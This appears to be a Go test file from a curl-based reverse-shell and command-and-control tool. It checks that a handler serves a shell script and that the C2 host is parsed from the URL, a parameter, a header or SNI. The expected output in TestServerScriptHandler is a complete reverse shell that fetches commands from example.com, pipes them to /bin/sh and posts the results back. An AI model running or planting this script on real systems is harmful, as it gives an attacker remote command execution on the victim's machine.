package hsrv

/*
 * script_test.go
 * Tests for script.go
 * By J. Stuart McMurray
 * Created 20240324
 * Last Modified 20240327
 */

import (
	"bytes"
	"net/http"
	"net/http/httptest"
	"regexp"
	"strings"
	"testing"

	"github.com/magisterquis/curlrevshell/lib/opshell"
)

func TestServerScriptHandler(t *testing.T) {
	_, och, s := newTestServer(t)
	rr := httptest.NewRecorder()
	rr.Body = new(bytes.Buffer)
	s.scriptHandler(rr, httptest.NewRequest(http.MethodGet, "/c", nil))
	if http.StatusOK != rr.Code {
		t.Errorf("Non-OK Code %d", rr.Code)
	}

	/* Work out the ID and make sure the log is correct. */
	gotLog := <-och
	ms := regexp.MustCompile(` ID:(\S+) `).FindStringSubmatch(gotLog.Line)
	if 2 != len(ms) {
		t.Fatalf("Could not find ID in log line %q", gotLog.Line)
	}
	id := ms[1]
	gotLog.Line = strings.ReplaceAll(gotLog.Line, id, "IDID")
	wantLog := opshell.CLine{
		Color: ScriptColor,
		Line:  "[192.0.2.1] Sent script: ID:IDID URL:example.com",
	}
	if gotLog != wantLog {
		t.Errorf(
			"Incorrect log message:\n got: %#v\nwant: %#v",
			gotLog,
			wantLog,
		)
	}

	/* Make sure the template came out ok, too. */
	wantBody := `#!/bin/sh

curl -Nsk --pinnedpubkey "sha256//xxx=" https://example.com/i/IDID </dev/null 2>&0 |
/bin/sh 2>&1 |
while read line; do
	if ! curl -Nsk --pinnedpubkey "sha256//xxx=" https://example.com/o/IDID --data-binary @- <<_eof-IDID; then
$line
_eof-IDID
		break
	fi
done >/dev/null 2>&1
`
	gotBody := rr.Body.String()
	gotBody = strings.ReplaceAll(gotBody, id, "IDID") /* Remove ID */
	gotBody = regexp.MustCompile(                     /* Remove hash */
		`"sha256//[0-9A-z+/]{43}="`,
	).ReplaceAllString(gotBody, `"sha256//xxx="`)
	if gotBody != wantBody {
		t.Errorf(
			"Incorrect body:\n"+
				" got:\n%s\n"+
				"want:\n%s",
			gotBody,
			wantBody,
		)
	}
}

func TestC2URL(t *testing.T) {
	for _, c := range []struct {
		have *http.Request
		want string
	}{{
		have: httptest.NewRequest(
			http.MethodGet,
			"https://kittens.com/simple_URL",
			nil,
		),
		want: "kittens.com",
	}, {
		have: httptest.NewRequest(
			http.MethodGet,
			"http://kittens.com/as_param?"+
				C2Param+
				"=moose.com",
			nil,
		),
		want: "moose.com",
	}, {
		have: func() *http.Request {
			req := httptest.NewRequest(
				http.MethodGet,
				"http://kittens.com/as_header",
				nil,
			)
			req.Header.Set(
				C2Param,
				"moose.com",
			)
			return req
		}(),
		want: "moose.com",
	}, {
		have: func() *http.Request {
			req := httptest.NewRequest(
				http.MethodGet,
				"https://kittens.com/from_SNI",
				nil,
			)
			req.Host = ""
			return req
		}(),
		want: "kittens.com",
	}, {
		have: func() *http.Request {
			req := httptest.NewRequest(
				http.MethodGet,
				"https://kittens.com/as_header",
				nil,
			)
			req.Header.Set(
				C2Param,
				"moose.com",
			)
			return req
		}(),
		want: "moose.com",
	}} {
		t.Run(c.have.URL.String(), func(t *testing.T) {
			got, err := c2URL(c.have)
			if nil != err {
				t.Fatalf("Error: %s", err)
			}
			if got != c.want {
				t.Fatalf(
					"URL incorrect:\n"+
						" got: %s\n"+
						"want: %s",
					got,
					c.want,
				)
			}
		})
	}
}
